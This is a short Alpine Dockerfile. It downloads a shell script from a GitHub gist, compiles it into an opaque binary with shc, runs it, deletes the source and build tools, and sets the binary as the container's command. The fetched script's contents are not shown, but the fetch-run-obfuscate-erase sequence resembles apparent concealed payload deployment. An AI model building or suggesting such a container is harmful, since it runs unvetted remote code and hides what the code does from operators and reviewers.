FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/vickunwu/32e196f37542b47cf88296205178d5d4/raw/1d6d035d940d5be9ae44f7cbcefe2f6a9fd5d9bf/wedog.sh

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
